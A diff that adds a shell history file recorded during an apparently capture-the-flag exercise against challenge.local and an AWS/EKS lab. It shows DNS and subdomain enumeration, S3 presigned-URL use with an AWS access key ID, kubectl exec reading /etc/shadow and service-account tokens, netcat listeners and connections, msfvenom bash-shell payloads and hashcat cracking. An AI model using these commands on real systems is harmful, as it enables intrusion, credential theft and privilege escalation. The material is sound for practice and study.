@@ -1,0 +1,999 @@
+  425  cat 29
+  429  binwalk -e download.png
+  434  binwalk -e download.png --run-as=root
+  436  cat download.png
+  437  cat download.png | grep CSO
+  439  binwalk download.png --run-as=root
+  440  cd ../Pictures
+  442  binwalk  -ecircle_of_fun.jpg --run-as=root
+  443  binwalk  -e circle_of_fun.jpg --run-as=root
+  445  cd _circle_of_fun.jpg.extracted
+  447  cat flag/flag.txt 
+  448  dig -txt ctf.cso.att.com
+  449  dig -any ctf.cso.att.com
+  450  dig +any ctf.cso.att.com
+  451  dig +all ctf.cso.att.com
+  452  dirsearch
+  453  dirsearch -u challenge.local
+  454  dnsx
+  455  dnsx --help
+  456  dnsx -a 10.0.0.2
+  457  dnsx -a 10.0.2.171
+  458  dnsx -a challenge.local
+  459  dnsmap
+  460  dnsmap challenge.local
+  461  dnsmap ctf.cso.att.com
+  462  dnsmap challenge.local -w /usr/share/dnsmap/wordlist_TLAs.txt 
+  463  version: 0.2\n\nphases:\n  install:\n    runtime-versions:\n      java: corretto11\n  pre_build:\n    commands:\n      - echo Nothing to do in the pre_build phase...\n  build:\n    commands:\n      - echo Build started on `date`\n      - mvn install\n  post_build:\n    commands:\n      - echo Build completed on `date`\nartifacts:\n  files:\n    - target/messageUtil-1.0.jar
+  464  Bucket=dmh-cloudops Region=us-east-1 Object=flag.txt Algorithm=AWS4-HMAC-SHA256 Credential=AKIAXL2QBRQSET6O7U4C%2F20230501%2Fus-east-1%2Fs3%2Faws4_request Date=20230501T130928Z Expires=604800 SignedHeaders=host Signature=356b3ed12bdf26246080215f3ff905f29dbef3935e612c125659c0cb4404c7ce\n\n
+  465  aws s3 cp s3://dmh-cloudops/flat.txt flag.txt
+  466  aws s3 cp s3://dmh-cloudops.s3.amazonaws.com/flat.txt flag.txt
+  467  aws s3 cp s3://dmh-cloudops.s3.amazonaws.com/flag.txt flag.txt
+  468  curl https://dmh-cloudops.s3.amazonaws.com/flag.txt -o flag.txt
+  471  aws s3 presign s3
+  472  aws s3 presign s3://dmh-cloudops/flag.txt --expires-in 600
+  473  curl "https://dmh-cloudops.s3.amazonaws.com/flag.txt" -o flag.txt
+  478  sudo date -s "2023-05-01 16:23:20"
+  481  aws s3 cp s3://dmh-cloudops.s3.amazonaws.com/flag.txt flag.txt --region us-east-1
+  482  aws get-caller-identify
+  483  aws s3 
+  484  aws get-caller-identify--help
+  485  aws s3 --help
+  486  aws s3 help
+  487  HISTORY
+  490  aws eks describe-cluster --name dmh-holdings
+  491  aws eks --help
+  492  aws eks 
+  494  aws eks get-token
+  495  aws eks get-token --dmh-hodlings
+  496  aws eks get-token --dmh-holdings
+  500  aws eks help
+  502  curl -H "Authorization:AWS4-HMAC-SHA256 Credential=AKIAXL2QBRQSET6O7U4C/20230501/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date,Signature=356b3ed12bdf26246080215f3ff905f29dbef3935e612c125659c0cb4404c7ce" -H "x-amz-content-sha256: 356b3ed12bdf26246080215f3ff905f29dbef3935e612c125659c0cb4404c7ce" -H "x-amz-date:20230501T130928Z" https://dmh-cloudops.s3.amazonaws.com/flag.txt -o flag.txt\n
+  504  curl https://dmh-cloudops.s3.us-east-1.amazonaws.com/flag.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAXL2QBRQSET6O7U4C%2F20230501%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=356b3ed12bdf26246080215f3ff905f29dbef3935e612c125659c0cb4404c7ce&X-Amz-Date=20230501T130928Z&X-Amz-SignedHeaders=host&X-Amz-Expires=604800 -o flag.txt
+  505  wget https://dmh-cloudops.s3.us-east-1.amazonaws.com/flag.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAXL2QBRQSET6O7U4C%2F20230501%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=356b3ed12bdf26246080215f3ff905f29dbef3935e612c125659c0cb4404c7ce&X-Amz-Date=20230501T130928Z&X-Amz-SignedHeaders=host&X-Amz-Expires=604800
+  506  dig +txt 10.0.2.171/treasure-map
+  507  -
+  508  dig -txt 10.0.2.171/treasure-map
+  509  dig badge.challenge.local
+  510  dns-rebind --help
+  511  dig @10.0.0.2
+  512  dig axfr @10.0.2.171 challenge.local
+  513  dig axfr @10.0.0.2\ challenge.local
+  514  dig axfr @10.0.0.2 challenge.local
+  515  nc -lnvp 9999
+  517  python -m http.server 9999
+  518  nslookup badge.challenge.local
+  519  sudo nmap -sV -sC challenge.local -p 8450
+  520  dig ctf.cso.att.com TXT
+  521  dig -txt cft.cso.att.com
+  522  httprobe
+  523  httprobe --help
+  525  aws eks list-clusteres
+  527  aws eks get-token --cluster-name dmh-holdings
+  528  history | grep kube
+  529  aws eks list-clusteres --namespace=dmh-holdings
+  530  aws eks list-clusters --namespace=dmh-holdings
+  531  aws sts get-caller-identity
+  533  nslookup https://F8A3116DD694AB18E14F087B1E1160E2.gr7.us-east-1.eks.amazonaws.com
+  534  dig -txt https://F8A3116DD694AB18E14F087B1E1160E2.gr7.us-east-1.eks.amazonaws.com
+  535  dig -txt https://F8A3116DD694AB18E14F087B1E1160E2.gr7.us-east-1.eks.amazonaws.com TXT
+  536  dig +all https://F8A3116DD694AB18E14F087B1E1160E2.gr7.us-east-1.eks.amazonaws.com TXT
+  537  dig +all https://F8A3116DD694AB18E14F087B1E1160E2.gr7.us-east-1.eks.amazonaws.com
+  539  history | grep svc
+  540  kubectl describe nas
+  541  kubectl describe ns
+  542  kubectl describe nodes
+  543  kubectl logs
+  546  cd ~/.aws
+  549  ls -lia Desktop
+  550  ls .aws
+  551  kubectl exec vault-6dc5bd4f95 --namespace=dmh
+  552  kubectl exec vault-6dc5bd4f95 --namespace=dmh -- bash -c "find . -name flag"
+  553  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "find . -name flag"
+  555  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "find / -name flag*"
+  556  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "find / -type f -exec grep -l "flag.txt" {} +
+  557  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "find / -type f -exec grep -l "flag.txt" {} +"
+  558  ffuf -u http://challenge.local -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.challenge.local"
+  560  ffuf -u http://challenge.local -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.challenge.local" -mc 403,404,405,500
+  561  nano test.php
+  562  php test.php 'http://badge.challenge.local:8450/login?next='
+  563  php test.php 'http://badge.challenge.local:8450/login?next=%2F'
+  564  php test.php 'http://badge.challenge.local:8450/login?next=%2FLogout'
+  566  php test.php 'http://badge.challenge.local:8450/login?next=%2Flogin'
+  567  php test.php 'http://badge.challenge.local:8450:google.com'
+  568  php test.php '0://http://badge.challenge.local:8450:google.com'
+  569  php test.php '0://badge.challenge.local:8450:google.com'
+  570  php test.php '0://badge.challenge.local:8450'
+  571  php test.php '0://badge.challenge.local:google.com'
+  572  php test.php '0://challenge.local:8450:google.com'
+  573  php test.php '0://badge.challenge.local:8450;google.com'
+  575  php test.php 'http://badge.challenge.local:845'
+  576  php test.php 'http://badge.challenge.local:8450'
+  577  php test.php 'http://badge.challenge.local:8450/login?next=%2Flogout'
+  578  php test.php 'http://badge.challenge.local:8450/login?next=%2Flogout;google.com'
+  579  php test.php 'http://badge.challenge.local:8450/login?next=%2F;google.com'
+  580  php test.php 'http://badge.challenge.local:8450;google.com'
+  581  php test.php 'http://badge.challenge.local:8450/;google.com'
+  582  php test.php 'http://badge.challenge.local:8450/$google.com'
+  585  php test.php 'http://badge.challenge.local:8450/google.com'
+  586  php test2.php
+  587  anonsurf
+  588  aws get svc
+  589  aws eks list
+  590  aws eks list-nodegroupds
+  591  aws eks list-nodegroups
+  592  aws eks list-clusters
+  593  aws eks describe-nodegroup --cluster-name dmh-hodlings
+  594  aws eks describe-nodegroup --cluster-name dmh-holdings
+  595  aws eks describe-cluster --cluster-name dmh-holdings
+  596  aws eks update-kubeconfig
+  597  aws eks update-kubeconfig --name dmh-holdings
+  599  aws ekslist-kubeconfig
+  600  aws eks list-kubeconfig
+  601  aws get svc -n
+  602  aws get svc -n dmh-holdings
+  603  aws get svc -n eks-deploy
+  604  aws get svc kubectl get svc -n dmh-holdings
+  606  kubectl get svc -n dmh-cloudops
+  607  kubectl get svc -n 506437143588
+  608  aws eks update-kubeconfig --region us-east-1 --name dmh-holdings
+  609  kubectl get svc
+  610  kubectl get svc -n dmh-holdings
+  611  kubectl list
+  612  kubectl help
+  613  kubectl cluster-info
+  614  kubectl cluster-info -n dmh-holdings
+  615  kubectl cluster-info dump
+  616  kubectl get namespaces
+  617  kubectl cluster-info -n dmh
+  618  kubectl get svc -n dmh
+  619  kubectl get svc -n default
+  621  aws eks update-kubeconfig --name dmh
+  622  kubectl create
+  623  kubectl create clusterrole
+  624  kubectl create clusterrole test
+  625  nano test.yaml
+  626  kubectl create -f test.yaml
+  627  kubectl get ns
+  629  kubectl get pods -name dmh
+  630  kubectl config current-context
+  631  kubectl config set-credentials
+  632  kubectl config set-credentials cluster-admin --username=admin --password=Password123
+  633  cat test
+  639  cat test.yaml
+  640  cat /root/.kube/c
+  642  kubectl create namespace test
+  644  cat /root/.kube/config
+  645  kubectl config user-context dmh
+  646  kubectl config use-context dmh
+  647  kubectl config use-context dmh-holdings
+  648  kubectl config get-contexts
+  649  kubectl config use-context arn:aws:eks:us-east-1:506437143588:cluster/dmh-holdings
+  650  kubectl apply -f test.yaml
+  651  kubectl config use-context arn:aws:eks:us-east-1:506437143588:cluster/dmh
+  652  kubectl exec 
+  658  cat about.html.bak
+  662  ~
+  664  cd Downloads
+  667  rm -rf _stripeslogo_new.png.extracted
+  668  mv stripeslogo_new.png ../
+  669  cat * | grep <
+  670  cat * | grep \<
+  671  cat * | grep \<\!
+  673  cat accntInfo.php.bak | grep \<\!
+  674  cat * | grep \[CSO
+  675  cat * | grep [CSO
+  676  cat * | grep CSO
+  677  cat recover.html.bak | grep \<\!
+  678  cat transact.php.bak | grep \<\!
+  681  cat logins.csv
+  683  cat 
+  688  nano about.html.bak
+  689  nano accntInfo.php.bak
+  690  nano create.php.bak
+  691  nano myinfo.php.bak
+  692  nano payload.php
+  693  nano recover.html.bak
+  694  nano transact.php.bak
+  695  cat payload.php
+  698  cat accntInfo.php.bak
+  702  cat create.php.bak
+  703  cat create.php.bak | grep cNum
+  705  \n
+  706  cat * | grep hard
+  708  cat transact.php.bak
+  709  cat recover.html.bak
+  710  cat myinfo.php.bak
+  721  gopher
+  722  gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://badge.challenge.local:8450/ -t 20 k
+  723  gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://badge.challenge.local:8450//login?next=%2F -t 20 k
+  724  gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://badge.challenge.local:8450//login?next=%2F/edaa7f78-5b9a-439d-90ba-a6e3434961b1  -t 20 k
+  727  ffuf
+  728  nc -lnvp 8888
+  731  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "ls"
+  732  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "ls /home"
+  733  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "ls /root"
+  734  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "sudo ls /root"
+  735  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "cat /etc/passwd"
+  736  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "cat /etc/shadow"
+  737  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "sudo -l"
+  738  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "find . -name dmh"
+  739  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c ls ./run/secrets"
+  740  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "ls ./run/secrets"
+  741  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "ls ./run/secrets/kubernetes.io/"
+  742  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "ls ./run/secrets/kubernetes.io/serviceaccouunt"
+  743  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "ls ./run/secrets/kubernetes.io/flag.txt"
+  744  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "cat ./run/secrets/kubernetes.io/flag.txt"
+  745  kubectl get pod dmh -o jsonpath='{status.podIP}' --namespace=dmh
+  746  kubectl get pod -o jsonpath='{status.podIP}' --namespace=dmh
+  747  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "ls ./run/secrets/kubernetes.io/serviceaccount"
+  748  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "ls ./run/secrets/kubernetes.io/serviceaccount/namespace"
+  749  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "cat ./run/secrets/kubernetes.io/serviceaccount/namespace"
+  750  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "cat ./run/secrets/kubernetes.io/serviceaccount/token"
+  757  rm -rf flag.txt
+  758  kubectl cp vault-6dc5bd4f95-tk5gm/shell.flag.txt ./flag2.txt --namespace=dmh
+  759  kubectl cp vault-6dc5bd4f95-tk5gm/shell/flag.txt ./flag2.txt --namespace=dmh
+  760  kubectl cp vault-6dc5bd4f95-tk5gm:shell/flag.txt ./flag2.txt --namespace=dmh
+  762  506437143588.dkr.ecr.us-east-1.amazonaws.com/shell@sha256:a4c755ee70767b3d4a00fb6431820abd1e4ccdfb4bc3aa42b5c65c7f9d968bb
+  763  kubectl desribe pod vault-6dc5bd4f95-tk5gm
+  764  kubectl describe pod vault-6dc5bd4f95-tk5gm
+  766  kubectl exec -it vault-6dc5bd4f95-tk5gm -- /bin/bash
+  767  kubectl exec -it vault-6dc5bd4f95-tk5gm -- /bin/bash --namespace=dmh
+  768  kubectl exec -it vault-6dc5bd4f95-tk5gm --namespace=dmh -- /bin/bash
+  770  python -m http.server 8888
+  773  kubectl get pods --namespace=dmh
+  774  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "whoami"
+  775  kubectl get pods --namespace=astra-cso-att
+  776  kubectl get pods --namespace=default
+  777  kubectl get pods --namespace=ingress-nginx
+  778  kubectl get pods --namespace=kube-node-lease
+  779  kubectl get pods --namespace=kube-public
+  780  kubectl get pods --namespace=kube-system
+  781  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "cat /root/flag.txt"
+  782  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "nc 10.0.2.234 1234"
+  783  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "ip a"
+  784  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "ipconfig"
+  785  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "find . -name secret"
+  786  kubectl exec vault-6dc5bd4f95-tk5gm --namespace=dmh -- bash -c "find . -type f -name "dmh""
+  787  kubectl get secret flag -o jsonpath='{.data} --namespace=dmh 
+  788  kubectl get secret flag -o jsonpath='{.data}' --namespace=dmh 
+  789  echo W0NTT0NURl9jQHIzbDNzc193aDFzcDNyXQ== | base64 -d
+  790  kubectl get
+  791  kubectl get -h
+  792  kubectl get secret flag
+  793  kubectl get secret flag --namespace=dmh
+  794  kube-hunter
+  795  kubectl get nodes -o wide
+  796  kubectl get nodes -o wide --namespace=dmh
+  797  kubectl get pods
+  799  nmap -p 6443 10.0.101.248
+  800  nmap -p 6443 10.0.101.2
+  801  kubectl get nodes -o wide --namespace=dmhkubectl cp kube-api-access-4gkcl:/shell/flag.txt . flag.txt
+  802  kubectl cp kube-api-access-4gkcl:/shell/flag.txt . flag.txt
+  803  kubectl cp kube-api-access-4gkcl:/shell/flag.txt ./flag.txt
+  804  kubectl cp kube-api-access-4gkcl:/shell/flag.txt ./flag.txt --namespace=dmh
+  805  kubectl cp 10..0.101.248:/shell/flag.txt ./flag.txt --namespace=dmh
+  806  kubectl cp 10.0.101.248:/shell/flag.txt ./flag.txt --namespace=dmh
+  807  kubectl cp vault-6dc5bd4f95-tk5gm:/shell/flag.txt ./flag.txt --namespace=dmh
+  809  kubectl cp vault-6dc5bd4f95-tk5gm:shell/flag.txt ./flag.txt --namespace=dmh
+  810  cat flag
+  811  cat flag.
+  812  cat flag.txt
+  814  ls /
+  816  kubectl cp vault-6dc5bd4f95-tk5gm:shell/flag.txt /root/flag.txt --namespace=dmh
+  818  kubectl cp vault-6dc5bd4f95-tk5gm:/shell/flag.txt /root/flag.txt --namespace=dmh
+  820  kubectl cp vault-6dc5bd4f95-tk5gm:/shell:flag.txt /root/flag.txt --namespace=dmh
+  821  kubectl describe pod vault-6dc5bd4f95-tk5gm --namespace=dmh
+  822  kubectl get services vault-6dc5bd4f95-tk5gm --namespace=dmh
+  823  curl 506437143588.dkr.ecr.us-east-1.amazonaws.com/shell:flag
+  824  docker inspect shell
+  826  docker containers
+  827  docker list containers
+  828  docker --list containers
+  829  docker --list container
+  830  docker containers --list
+  831  docker containers list
+  833  dig 10.0.101.248
+  834  dig 10.0.101.248 TXT
+  835  nslookup 10.0.101.248
+  836  kubescan
+  837  kubectl version
+  838  kubectl version --server https://10.0.101.248:6443
+  839  kubectl version --server 10.0.101.248:6443
+  840  nc 10250 10.0.101.248
+  841  nc 10.0.101.248 -p 10250
+  842  nc 10.0.101.248 10250
+  844  namp -p 10250 10.0.101.248
+  845  nmap -p 10250 10.0.101.248
+  846  nmap -p 10250 10.0.101.248 -Pn
+  848  ls /usr/share/wordlists
+  849  find /usr/share/wordlists -name "share"
+  850  wfuzz -c -w list -w list2 -w list3 -w list4 -w list5 -w list6 -w list7 -d "vpOne=2FUZZFUZ2Z97&vpTwo=44191&vpThree=4FUZ3Z9FUZ4ZFUZ5Z&vpFour=14FUZ6ZFUZ7Z1&submit=parascendhttp;//dmh-exchange.challenge.local/vipReg.php" >fuzzults
+  851  wfuzz -c -w list -w list2 -w list3 -w list4 -w list5 -w list6 -w list7 -d "vpOne=2FUZZFUZ2Z97&vpTwo=44191&vpThree=4FUZ3Z9FUZ4ZFUZ5Z&vpFour=14FUZ6ZFUZ7Z1&submit=parascend" http://dmh-exchange.challenge.local/vipReg.php >fuzzults
+  853  sudo pip install pycurl wfuzz
+  855  nano list
+  856  nano list2
+  857  nano list3
+  858  nano list4
+  859  nano list5
+  860  nano list6
+  861  nano list7
+  862  sudo wfuzz -c -w list -w list2 -w list3 -w list4 -w list5 -w list6 -w list7 -d "vpOne=2FUZZFUZ2Z97&vpTwo=44191&vpThree=4FUZ3Z9FUZ4ZFUZ5Z&vpFour=14FUZ6ZFUZ7Z1&submit=parascend" http://dmh-xchange.challenge.local/vipReg.php >fuzzults
+  864  sudo apt install libcurl4-openssl-dev
+  865  wfuzz -c -w list -w list2 -w list3 -w list4 -w list5 -w list6 -w list7 -d "vpOne=2FUZZFUZ2Z97&vpTwo=44191&vpThree=4FUZ3Z9FUZ4ZFUZ5Z&vpFour=14FUZ6ZFUZ7Z1&submit=parascend" http://dmh-xchange.challenge.local/vipReg.php >fuzzults
+  866  wfuzz -h
+  868  pip install pycurl
+  869  sudo pip install pycurl
+  870  export PYCURL_SLL_LIBRARY=openssl
+  871  export PYCURL_SLL_LIBRARY_PATH=/usr/lib/x86_64-linux-gnu
+  872  wfuzz -c -w list -w list2 -w list3 -w list4 -w list5 -w list6 -w list7 -d "vpOne=2FUZZFUZ2Z97&vpTwo=44191&vpThree=4FUZ3Z9FUZ4ZFUZ5Z&vpFour=14FUZ6ZFUZ7Z1&submit=parascend" -u http://dmh-xchange.challenge.local/vipReg.php >fuzzults
+  874  ip a
+  875  nc -lvnp 1234
+  876  docker imspect 506437143588.dkr.ecr.us-east-1.amazonaws.com/shell:flag
+  877  docker inspect 506437143588.dkr.ecr.us-east-1.amazonaws.com/shell:flag
+  878  docker inspect 506437143588.dkr.ecr.us-east-1.amazonaws.com
+  880  ssh 10.0.2.66/privescone
+  881  nc 10.0.2.66/privescone\n
+  882  nc 10.0.2.66
+  883  sudo nmap -sC -sV 10.0.2..66
+  884  ping 10.0.2.66/privescone
+  885  ping 226.603.371.5
+  886  nc 135.16.238.99:5000\n
+  887  ssh 135.16.238.99
+  888  crontab -L
+  890  crontab 0e
+  891  crontab -e
+  893  sudo crontab -l
+  895  ps awxf
+  896  su crontab -l
+  899  cat /etc/
+  901  ps auxf
+  903  lsof -i 47744
+  904  lsof -i :47744
+  905  sudo ps kill 799
+  906  sudo kill 799
+  921  ps -ef | grep sshd
+  922  ps auxf | grep ssh
+  923  netstat -antp
+  924  ps -ef | grep container
+  929  unalias vi
+  930  cat /etc/systemd/system
+  933  ls /etc/systemd/system/bootlogs.service
+  934  ls /etc/systemd/system/
+  935  ls -lia /etc/systemd/system/
+  937  cat /var/log/messages
+  938  tail /var/log/sys
+  939  tail /var/log/syslog
+  940  crontab -l
+  941  cat /var/log/syslog
+  942  cat /etc/cron.d/john
+  943  cat /etc/cron.d/sysstat
+  944  cat /etc/cron.d/php
+  945  ls /usr/share/john/
+  946  cat /etc/cron.d/e2scrub_all e2
+  947  cat /etc/cron.d/e2scrub_all q
+  949  service cron stop
+  950  ls /var/spool/
+  951  ls /var/spool/cron
+  952  cat/var/spool/cron
+  953  cat /var/spool/cron/crontabs
+  954  cat /var/spool/cron/crontabs/root
+  955  find . -name ".sh"
+  960  find . -type f -name "*.sh"
+  961  find . -type f -name "*.py"
+  966  ls /home/ssm-user
+  967  find . -user ssm-user
+  968  find . -user ssm-user -perm /u-w
+  969  find . -user ssm-user -perm /u=w
+  970  find . -type f -perm /4000
+  971  find . -name "*.sh"
+  972  lsof | grep bash && lsof | grep .sh
+  974  find . / -type f -name "*xdotool" -exec grp -H "xdotool" {} \;
+  975  find / -type f -name "*xdotool" -exec grp -H "xdotool" {} \;
+  976  find / -type f -name "*xdotool" -exec grep -H "xdotool" {} \;
+  977  find / -type f -name "*xdotool*" -exec grep -H "xdotool" {} \;
+  978  find / -name "*xdotool*" -exec "xdotool" {} \;
+  979  find / -name "*xdotool*" -exec echo {} \;
+  980  find / "*xdotool*" -exec echo {} \;
+  982  ls /etc/init.d/
+  984  find . type -f -mtime -7
+  986  find . -type f -mtime -7
+  987  find . -type f -mtime -1
+  988  cat ./list
+  989  find . -type f -mtime -1 | grep -vE "google|Google"
+  990  find . -type f -mtime -1 | grep -vE "google|Google|mozilla"
+  992  cat ./zshrc
+  993  cat ~/.zshrc
+  994  nano ~/.zshrc
+  995  find . -type f -mtime -1 | grep -vE "google|Google|mozilla|kube"
+  996  cat ~/.cache/dconf/user
+  997  find . -type f -ctime -60 | grep -vE "google|Google|mozilla|kube"
+  998  find . -type f -ctime -60 | grep -vE "google|Google|mozilla|kube|Burp|crypto_transactions"
+  999  find . -type f -ctime +120m | grep -vE "google|Google|mozilla|kube|Burp|crypto_transactions"
+ 1004  find . -type f -ctime -120m | grep -vE "google|Google|mozilla|kube|Burp|crypto_transactions"
+ 1005  find . -type f -ctime -1 | grep -vE "google|Google|mozilla|kube|Burp|crypto_transactions"
+ 1006  cat ~/.local/share/Mousepad/autosave-0
+ 1009  ls Videos
+ 1010  gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://FUZZ.challenge.local -t 20
+ 1011  feroxbuster --help
+ 1012  feroxbuster -u https://FUZZ.challenge.com/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -x php,html,asp,aspx,jsp -k
+ 1013  feroxbuster -u http://FUZZ.challenge.com/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -x php,html,asp,aspx,jsp -k
+ 1014  feroxbuster -u http://FUZZ.challenge.local/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -x php,html,asp,aspx,jsp -k
+ 1018  fuff -u http://FUZZ.challenge.local -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -recursion -e .php,.html
+ 1019  ffuf -u http://FUZZ.challenge.local -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -recursion -e .php,.html
+ 1020  ffuf -u http://FUZZ.challenge.local -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -recursion -e .html
+ 1021  ffuf -u http://FUZZ.challenge.local -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -e .html
+ 1022  ffuf -u http://FUZZ.challenge.local -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -e .html > ffufresults
+ 1023  ffuf -u http://FUZZ.challenge.local -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt  > ffufresults
+ 1026  cat ffufresults| grep -eV "200"
+ 1027  cat ffufresults | grep -eV "200"
+ 1032  cat ffufresults | grep -vE "200"
+ 1033  tail ffufresults
+ 1034  tail -f ffufresults
+ 1035  lsof
+ 1036  lsof -i :
+ 1037  ps -ef
+ 1038  watch -n 3 'ps aux | grep -v grep| | grep -v watch'
+ 1039  watch -n 3 'ps aux | grep -v grep | grep -v watch'
+ 1042  history | grep find
+ 1044  find . -type f "*CSOCTF*" -exec echo {} +
+ 1045  find . -type f / "*CSOCTF*" -exec echo {} +
+ 1049  grep -r "CSOCTF" .
+ 1050  systemctl disable patch-update.timer
+ 1051  systemctl stop patch-update.timer
+ 1052  systemctl disable sched-reboot.timer
+ 1053  systemctl stop sched-reboot.timer
+ 1054  ping -b 135.91.78.255
+ 1055  nmap -sP 135.91.78.0/24
+ 1056  ls /home/kali/Desktop/overflow/submission
+ 1057  ls /home/kali/Desktop/
+ 1059  ls /home/kali
+ 1060  msfvenom -p linux/x86/exec CMD='/bin/bash -p'-f elf
+ 1061  msfvenom -p linux/x86/exec CMD='/bin/bash -p' -f elf
+ 1062  msfvenom -p linux/x86/exec CMD='/bin/bash -p' -f elf > payload.elf
+ 1064  cat payload.elf
+ 1065  msfvenom -p linux/x32/exec CMD='/bin/bash -p' -f elf > payload.elf
+ 1066  msfvenom -p linux/x86/exec CMD='/bin/bash -p' R -o linux_x86_exec
+ 1068  cat linux_x86_exec
+ 1069  msfvenom -h
+ 1070  ndisasm -u linux_x86_exec
+ 1071  msfvenom -p linux/x86/exec CMD='/bin/bash -p' -f c -b '\x00'
+ 1072  hashcat -m O $5$sfgkz/ZrdYAz$wiMAKt7Hf9/Htw6WmwVqlavJ7MXwIeotVK8nQau0y84 /usr/share/wordlists/john.lst
+ 1073  hashcat -m 0 $5$sfgkz/ZrdYAz$wiMAKt7Hf9/Htw6WmwVqlavJ7MXwIeotVK8nQau0y84 /usr/share/wordlists/john.lst
+ 1074  hashcat -m 0 $5$sfgkz/ZrdYAz$wiMAKt7Hf9/Htw6WmwVqlavJ7MXwIeotVK8nQau0y84 /usr/share/wordlists/rockyou.txt.gz
+ 1075  gzip -d /usr/share/wordlists/rockyou.txt.gz
+ 1077  hashcat -m 0 $5$sfgkz /usr/share/wordlists/rockyou.txt
+ 1078  hashcat -m 0 $wiMAKt7Hf9/Htw6WmwVqlavJ7MXwIeotVK8nQau0y84 /usr/share/wordlists/rockyou.txt
+ 1079  hashcat -m 0 $5$sfgkz/ZrdYAz /usr/share/wordlists/rockyou.txt
+ 1080  hashcat -SHA256 $5$sfgkz/ZrdYAz$wiMAKt7Hf9/Htw6WmwVqlavJ7MXwIeotVK8nQau0y84 /usr/share/wordlists/rockyou.txt
+ 1081  hashcat -m 0 8548a13b8fe5d03d9014486ec0173bfc12760b2e55de56747f614fc84dde7d18 /usr/share/wordlists/rockyou.txt
+ 1082  hashcat -a 3 0 8548a13b8fe5d03d9014486ec0173bfc12760b2e55de56747f614fc84dde7d18 /usr/share/wordlists/rockyou.txt
+ 1083  hashcat -a 3 8548a13b8fe5d03d9014486ec0173bfc12760b2e55de56747f614fc84dde7d18 /usr/share/wordlists/rockyou.txt
+ 1084  hashcat -m 1400 -a 3 8548a13b8fe5d03d9014486ec0173bfc12760b2e55de56747f614fc84dde7d18 /usr/share/wordlists/rockyou.txt
+ 1085  hashcat -m 1420 -a 3 $5$sfgkz/ZrdYAz$wiMAKt7Hf9/Htw6WmwVqlavJ7MXwIeotVK8nQau0y84 /usr/share/wordlists/rockyou.txt
+ 1086  hashcat -m 1420 -m 0 $5$sfgkz/ZrdYAz$wiMAKt7Hf9/Htw6WmwVqlavJ7MXwIeotVK8nQau0y84 /usr/share/wordlists/rockyou.txt
+ 1087  hashcat -m 0 $5$sfgkz/ZrdYAz$wiMAKt7Hf9/Htw6WmwVqlavJ7MXwIeotVK8nQau0y84 /usr/share/wordlists/rockyou.txt
+ 1088  hashcat -m 0 wiMAKt7Hf9/Htw6WmwVqlavJ7MXwIeotVK8nQau0y84 /usr/share/wordlists/rockyou.txt
+ 1089  hashcat -m 7400 $5$sfgkz/ZrdYAz$wiMAKt7Hf9/Htw6WmwVqlavJ7MXwIeotVK8nQau0y84 /usr/share/wordlists/rockyou.txt
+ 1090  hashcat -m 1800 -s / -a 0 $5$sfgkz/ZrdYAz$wiMAKt7Hf9/Htw6WmwVqlavJ7MXwIeotVK8nQau0y84 /usr/share/wordlists/rockyou.txt
